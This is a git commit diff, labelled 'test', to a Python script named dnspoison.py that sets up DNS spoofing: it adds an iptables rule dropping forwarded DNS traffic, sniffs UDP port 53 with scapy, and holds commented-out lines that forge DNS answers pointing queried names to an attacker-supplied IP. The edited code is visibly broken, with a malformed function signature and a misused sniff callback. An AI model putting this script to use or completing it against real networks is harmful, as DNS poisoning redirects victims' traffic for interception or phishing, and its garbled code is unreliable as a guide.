a42cf82c6218495c5fb069cf2a88463514519fa6
m4ul <hansonlucas06@gmail.com>
2022-11-13 21:32:20 +0100

    test

--- dnspoison.py
+++ dnspoison.py
@@ -14,8 +14,8 @@ gotoIP = input()
 firewall = "iptables -A FORWARD -p UDP --dport 53 -j DROP" 
 Popen([firewall], shell=True, stdout=PIPE)
 
-def dnsspoof(IP):
-    if IP[0].haslayer(DNS) and IP[0].getlayer(DNS).qr==0:
+def dnsspoof(rec : IP):
+    if rec(IP).haslayer(DNS) and rec(IP).getlayer(DNS).qr==0:
         print("yeah")
         #spoof = IP(dst=a[0].getlayer(IP).src, src=a[0].getlayer(IP).dst)/UDP(dport=a[0].getlayer(UDP).sport, sport=a[0].getlayer(UDP).dport)/DNS(id=a[0].getlayer(DNS).id, qd=a[0].getlayer(DNS).qd, qr=1,an=DNSRR(rrname=a[0].getlayer(DNS).qd.qname, ttl=10, rdata=gotoIP) / DNSRR(rrname=a[0].getlayer(DNS).qd.qname, ttl=10, rdata=gotoIP))
         #sendp(spoof, verbose=1)
@@ -23,7 +23,7 @@ def dnsspoof(IP):
 
 
 while True:
-    sniff(prn = dnsspoof(IP),count=1, filter="udp port 53")
+    a = sniff(prn = dnsspoof(IP),count=1, filter="udp port 53")
     
 
 
